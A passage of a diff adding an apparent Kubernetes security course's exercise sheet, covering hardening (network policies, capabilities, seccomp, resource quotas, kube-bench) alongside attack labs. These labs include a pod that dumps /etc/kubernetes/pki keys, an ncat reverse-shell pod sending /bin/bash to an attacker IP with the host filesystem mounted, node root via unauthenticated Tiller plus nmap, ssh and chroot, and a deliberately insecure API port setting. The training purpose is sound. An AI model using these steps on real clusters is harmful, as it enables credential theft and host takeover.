+    hostPath:
+
+      path: /etc/kubernetes/pki
+
+      type: Directory
+
+ 
+--
+ 
+## Exercise - Key dumping
+-----------------
+ 
+
+kubectl create -f /home/ubuntu/manifests/key-dumper-pod.yml
+
+ 
+
+kubectl logs keydumper-pod
+
+ 
+--
+ 
+## Exercise - Getting a reverse shell from a pod
+-----------------
+ 
+
+ncat -l -p 8989
+
+ 
+--
+ 
+## Exercise - Reverse Shell - 2
+-----------------
+ 
+
+apiVersion: v1
+
+kind: Pod
+
+metadata:
+
+  name: ncat-reverse-shell-pod
+
+spec:
+
+  containers:
+
+  - name: ncat-reverse-shell
+
+    image: raesene/ncat
+
+    volumeMounts:
+
+    - mountPath: /host
+
+      name: hostvolume
+
+    args: ['[IP]', '8989', '-e', '/bin/bash']
+
+  volumes:
+
+  - name: hostvolume
+
+    hostPath:
+
+      path: /
+
+      type: Directory
+
+ 
+--
+ 
+## Exercise - Reverse Shell - 3
+-----------------
+ 
+
+nano /home/ubuntu/manifests/ncat-reverse-shell-pod.yml
+
+ 
+
+kubectl create -f /home/ubuntu/manifests/ncat-reverse-shell-pod.yml
+
+ 
+--
+ 
+## Exercise - Reverse Shell - 4
+-----------------
+ 
+
+ls
+
+ 
+
+whoami
+
+ 
+--
+ 
+## Setup a cluster for Network Policies
+-----------------
+ 
+
+kind create cluster --name=netpol --config=/home/ubuntu/kind_netpol_config/config.yaml
+
+ 
+
+kubectl create -f https://raw.githubusercontent.com/cilium/cilium/v1.6/install/kubernetes/quick-install.yaml
+
+ 
+--
+ 
+## Exercise - Network Policies
+-----------------
+ 
+
+kubectl run web --image=nginx --labels app=web --expose --port 80
+
+ 
+
+kubectl run -it netpoltest
+ --image mcscourse/alpine-containertools  /bin/ash
+
+ 
+
+curl http://web
+
+ 
+
+exit
+
+ 
+--
+ 
+## Exercise - Network Policies - 2
+-----------------
+ 
+
+kind: NetworkPolicy
+
+apiVersion: networking.k8s.io/v1
+
+metadata:
+
+  name: web-deny-all
+
+spec:
+
+  podSelector:
+
+    matchLabels:
+
+      app: web
+
+  ingress: []
+
+ 
+--
+ 
+## Exercise - Network Policies - 3
+-----------------
+ 
+
+kubectl apply -f ~/netpol/deny-web.yml
+
+ 
+
+kubectl attach -it [netpoltest]
+
+ 
+
+curl http://web
+
+ 
+--
+ 
+## General Approach
+-----------------
+ 
+
+    containers:
+
+      - name: carts-db
+
+        image: mongo
+
+        ports:
+
+        - name: mongo
+
+          containerPort: 27017
+
+        securityContext:
+
+          capabilities:
+
+            drop:
+
+              - all
+
+            add:
+
+              - CHOWN
+
+              - SETGID
+
+              - SETUID
+
+          readOnlyRootFilesystem: true
+
+ 
+--
+ 
+## capabilities
+-----------------
+ 
+
+            drop:
+
+              - all
+
+            add:
+
+              - CHOWN
+
+              - SETGID
+
+              - SETUID
+
+ 
+--
+ 
+## AppArmor
+-----------------
+ 
+
+container.apparmor.security.beta.kubernetes.io/<container_name>: {unconfined,runtime/default,localhost/<profile>}
+
+ 
+--
+ 
+## Seccomp
+-----------------
+ 
+
+annotations:
+
+  container.security.alpha.kubernetes.io/<container-name>: "runtime/default"
+
+ 
+--
+ 
+## Resource limits for Kubernetes containers
+-----------------
+ 
+
+   spec:
+
+     containers:
+
+       - name: webserver
+
+         image: nginx
+
+         resources:
+
+           limits:
+
+             memory: 600Mi
+
+             cpu: 1
+
+           requests:
+
+             memory: 300Mi
+
+             cpu: 500m
+
+ 
+--
+ 
+## Kubernetes Resources - Namespace Limits
+-----------------
+ 
+
+apiVersion: v1
+
+kind: ResourceQuota
+
+metadata:
+
+  name: resourcequotaexample
+
+spec:
+
+  hard:
+
+    requests.cpu: 3
+
+    requests.memory: 3Gi
+
+    limits.cpu: 4
+
+    limits.memory: 6Gi
+
+ 
+--
+ 
+## Exercise - Tooling - Kubeaudit
+-----------------
+ 
+
+kubeaudit all
+
+ 
+--
+ 
+## Exercise - Tooling - Kubesec
+-----------------
+ 
+
+docker run -i kubesec/kubesec:512c5e0 scan /dev/stdin < /home/ubuntu/manifests/privpod.yml
+
+ 
+--
+ 
+## Exercise - Command completion in Linux
+-----------------
+ 
+
+sudo kubectl completion bash >/etc/bash_completion.d/kubectl
+
+ 
+--
+ 
+## Exercise - kubectl proxy
+-----------------
+ 
+
+kubectl proxy
+
+ 
+--
+ 
+## Exercise - kubectl port-forward
+-----------------
+ 
+
+kubectl run webserver --image=nginx
+
+ 
+
+kubectl get po
+
+ 
+
+kubectl port-forward pod/[POD_NAME] 8099:80
+
+ 
+--
+ 
+## Exercise - kubectl cp
+-----------------
+ 
+
+kubectl cp default/[POD_NAME]:/etc/passwd ./passwd
+
+ 
+--
+ 
+## Exercise - kubectl -v7
+-----------------
+ 
+
+kubectl get po -v7
+
+ 
+--
+ 
+## Exercise - explaining things
+-----------------
+ 
+
+kubectl api-resources
+
+ 
+
+kubectl explain podsecuritypolicy
+
+ 
+
+kubectl explain podsecuritypolicy.spec
+
+ 
+
+kubectl explain podsecuritypolicy.spec --recursive
+
+ 
+--
+ 
+## Exercise - Install Krew
+-----------------
+ 
+
+(
+
+  set -x; cd "$(mktemp -d)" &&
+
+  curl -fsSLO "https://storage.googleapis.com/krew/v0.2.1/krew.{tar.gz,yaml}" &&
+
+  tar zxvf krew.tar.gz &&
+
+  ./krew-"$(uname | tr '[:upper:]' '[:lower:]')_amd64" install 
+    --manifest=krew.yaml --archive=krew.tar.gz
+
+)
+
+ 
+
+export PATH="${KREW_ROOT:-$HOME/.krew}/bin:$PATH"
+
+ 
+
+kubectl krew update
+
+ 
+
+kubectl krew search
+
+ 
+--
+ 
+## Exercise pod shell
+-----------------
+ 
+
+kubectl pod-shell
+
+ 
+
+kubectl pod-shell /bin/ash
+
+ 
+--
+ 
+## Exercise who-can get secrets
+-----------------
+ 
+
+kubectl who-can get secrets
+
+ 
+
+kubectl who-can get secrets -n default
+
+ 
+--
+ 
+## Exercise access-matrix
+-----------------
+ 
+
+kubectl access-matrix
+
+ 
+--
+ 
+## Exercise node-admin
+-----------------
+ 
+
+kubectl node-admin
+
+ 
+--
+ 
+## Exercise - Finding Tiller
+-----------------
+ 
+
+kubectl run -it YOURINITIALS-helm --image=raesene/alpine-containertools /bin/ash
+
+ 
+
+dig tiller-deploy.kube-system.svc.cluster.local
+
+ 
+--
+ 
+## Setting up Helm
+-----------------
+ 
+
+helm2 init --client-only
+
+ 
+
+helm2 repo update
+
+ 
+--
+ 
+## Exercise - Connecting to Tiller with Helm
+-----------------
+ 
+
+helm2 --host tiller-deploy.kube-system.svc.cluster.local:44134 version
+
+ 
+
+helm2 --host tiller-deploy.kube-system.svc.cluster.local:44134 ls
+
+ 
+--
+ 
+## Exercise - Getting Node Root Access Via Tiller
+-----------------
+ 
+
+helm --host tiller-deploy.kube-system.svc.cluster.local:44134 install /charts/privsshchart-0.1.0.tgz
+
+ 
+
+exit
+
+ 
+--
+ 
+## Exercise - Getting Node Root Access Via Tiller - 2
+-----------------
+ 
+
+nmap -sT -p 30000-320000 -v -n [IP]
+
+ 
+
+ssh -p [NODEPORT] root@[IP]
+
+ 
+
+chroot /host
+
+ 
+--
+ 
+## Exercise - Installing and running Kube-bench
+-----------------
+ 
+
+mkdir ~/kube-bench && cd ~/kube-bench
+
+ 
+
+docker run --rm -v `pwd`:/host aquasec/kube-bench:latest install
+
+ 
+
+docker cp kube-bench kind-control-plane:/
+
+docker cp cfg/ kind-control-plane:/
+
+ 
+
+docker exec -it kind-control-plane bash
+
+ 
+
+./kube-bench master
+
+ 
+--
+ 
+## Exercise - Installing & Running Kube-Hunter
+-----------------
+ 
+
+git clone https://github.com/aquasecurity/kube-hunter.git
+
+ 
+
+cd kube-hunter
+
+sudo apt install python3-pip
+
+pip3 install -r requirements.txt
+
+ 
+
+./kube-hunter.py
+
+ 
+--
+ 
+## kind configuration file
+-----------------
+ 
+
+kind: Config
+
+apiVersion: kind.sigs.k8s.io/v1alpha2
+
+nodes:
+
+# the control plane node config
+
+- role: control-plane
+
+  # patch the generated kubeadm config with some extra settings
+
+  kubeadmConfigPatches:
+
+  - |
+
+    apiVersion: kubeadm.k8s.io/v1beta1
+
+    kind: ClusterConfiguration
+
+    metadata:
+
+      name: config
+
+    apiServer:
+
+      extraArgs:
+
+        # Don't forget quotes on the values
+
+        insecure-bind-address: "0.0.0.0"
+
+        insecure-port: "8080"
+
+ 
+--
+ 
+## Exercise - Starting a kind of insecure cluster
+-----------------
+ 
+
+kind --config insecure-port.yaml --name insecure create cluster
+
+ 
+
+docker exec insecure-control-plane ip -br -c a
+
+ 
+
+curl http://172.17.0.2:8080
+
+ 
+--
+ 
